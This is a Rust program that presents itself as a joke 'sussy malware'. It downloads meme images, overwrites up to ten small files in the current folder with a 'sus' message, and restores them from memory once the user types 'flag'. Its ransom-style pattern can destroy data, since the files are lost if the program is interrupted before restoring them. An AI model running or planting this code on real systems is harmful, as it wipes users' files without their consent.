use bytes::Buf;
use filesize::PathExt;
use std::error::Error;
use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};

struct Document {
    _name: PathBuf,
    _content: Vec<u8>,
}

fn main() {
    println!("Welcome to the sussy malware ඞ \n");
    println!("ඞ ඞ ඞ ඞ ඞ ඞ ඞ ඞ ඞ \n> Please wait, making this folder sus....");

    match download_sus_imges() {
        Ok(()) => (println!("> Downloaded really sus images")),
        _ => {
            println!("Something is sus with your network, proceeding without downloading files.")
        }
    }

    let docs: Vec<Document> = match collect_files() {
        Ok(docs) => docs,
        Err(_error) => panic!("Something went wrong"),
    };

    match sus_files(&docs) {
        Ok(()) => println!("All of your files are sussed. Enter the flag to restore your files:"),
        _ => println!("Something went wrong"),
    }

    if ask_flag() == true {
        println!("Correct Flag");
        match restore_files(&docs) {
            Ok(()) => println!("All files are restored."),
            _ => (),
        }
    }
}

fn download_sus_imges() -> Result<(), Box<dyn Error>> {
    let images: Vec<&str> = vec![
        "https://i.redd.it/sqt01fync8381.jpg",
        "https://i.redd.it/oup944dz5mw51.jpg",
        "https://i.redd.it/zxynz9sgtgu51.jpg",
    ];

    let mut i = 0i32;
    for url in images {
        i = i + 1;
        let filename = format!("{}-{}", i.to_string(), "sus.jpg");
        let mut file = fs::File::create(filename)?;
        let mut content = reqwest::blocking::get(url)?.bytes()?.reader();
        std::io::copy(&mut content, &mut file)?;
    }
    Ok(())
}

fn collect_files() -> Result<Vec<Document>, Box<dyn Error>> {
    let mut documents: Vec<Document> = vec![];
    for entry in fs::read_dir(".")? {
        let _path_buf = entry?.path();
        let path = Path::new(&_path_buf);
        let ext = path.extension();
        if path.is_file() {
            let size = path.size_on_disk()?;
            if size < 800000 {
                if ext == None {
                    let doc: Document = match read_file(_path_buf) {
                        Ok(doc) => doc,
                        Err(_error) => panic!("Something went wrong"),
                    };
                    if documents.len() < 10 {
                        documents.push(doc);
                    }
                } else if ext.unwrap() != "jpg" {
                    let doc: Document = match read_file(_path_buf) {
                        Ok(doc) => doc,
                        Err(_error) => panic!("Something went wrong"),
                    };
                    if documents.len() < 10 {
                        documents.push(doc);
                    }
                }
            }
        }
    }
    Ok(documents)
}

fn read_file(_path_buf: PathBuf) -> Result<Document, Box<dyn Error>> {
    let mut file = fs::File::open(&_path_buf)?;
    let mut data: Vec<u8> = Vec::new();
    file.read_to_end(&mut data)?;

    let doc = Document {
        _name: _path_buf,
        _content: data,
    };

    Ok(doc)
}

fn sus_files(docs: &Vec<Document>) -> Result<(), Box<dyn Error>> {
    for doc in docs {
        let mut file = File::create(&doc._name)?;
        file.write_all(
            b"sus sus sus sus :: 
        This document has been made sus by the sussy malware
         :: sus sus sus",
        )?;
    }
    Ok(())
}

fn ask_flag() -> bool {
    let mut input = String::new();
    std::io::stdin()
        .read_line(&mut input)
        .expect("Something went wrong");
    if input.trim() == "flag" {
        true
    } else {
        println!("Wrong Flag. Please try again: ");
        ask_flag()
    }
}

fn restore_files(docs: &Vec<Document>) -> Result<(), Box<dyn Error>> {
    for doc in docs {
        let mut file = File::create(&doc._name)?;
        file.write_all(&doc._content)?;
    }
    Ok(())
}
